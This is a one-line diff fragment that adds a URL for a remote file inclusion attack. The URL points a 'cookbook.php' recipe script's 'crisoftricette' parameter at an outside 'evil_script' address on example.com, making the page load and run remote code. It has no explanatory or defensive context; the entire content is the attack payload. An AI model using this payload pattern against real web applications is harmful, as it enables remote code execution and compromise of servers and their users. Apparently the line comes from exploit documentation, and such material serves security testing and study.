@@ -1,0 +1,1 @@
+http://www.example.com/recipe/cookbook.php?crisoftricette=http://www.example.com/evil_script
